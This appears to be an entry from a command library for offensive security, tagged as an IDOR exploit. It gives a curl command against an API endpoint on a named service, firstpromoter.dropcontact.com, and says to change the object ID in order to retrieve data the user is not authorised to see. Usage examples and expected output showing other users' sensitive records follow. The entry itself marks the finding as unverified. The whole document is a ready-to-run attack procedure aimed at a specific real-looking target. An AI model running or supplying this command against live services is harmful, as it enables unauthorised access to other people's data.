---
data: >-
  curl -X GET "https://firstpromoter.dropcontact.com/api/objects/124" -H
  "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -v
tags:
  - web
  - exploit
  - idor
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 376d48a0-69bc-4804-8ae7-adbbd6cae57e
created_at: '2025-12-14T17:25:23.439Z'
updated_at: '2025-12-14T17:25:23.439Z'
verified: false
validated: true
submitted: true
---
# curl-idor-manipulation

## Command

```bash
curl -X GET "https://firstpromoter.dropcontact.com/api/objects/124" -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -v
```

## Description

This command uses curl to perform an HTTP GET request to a vulnerable IDOR endpoint in the firstpromoter service, manipulating the object ID to access unauthorized data. It includes authentication headers and verbose output for debugging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://firstpromoter.dropcontact.com/api/objects/124"` | The target URL with manipulated ID (replace 124 with target ID) | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication header with session token (omit if public endpoint) | No |
| `-H "Content-Type: application/json"` | Sets the content type for the request | Yes |
| `-v` | Enables verbose mode to show headers and status | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://firstpromoter.dropcontact.com/api/objects/124" -v
```

### Advanced Usage

```bash
curl -X GET "https://firstpromoter.dropcontact.com/api/objects/124" -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -o response.json -v
```

This saves the output to a file for further analysis.

## Expected Output

Successful execution returns a 200 OK status with JSON containing sensitive object data, e.g., {"id":124,"user":"unauthorized@example.com","referrals":["data"]} . Verbose mode shows full request/response headers.

## Related

- [[Related Procedure: Exploit-IDOR-in-FirstPromoter-Service]]
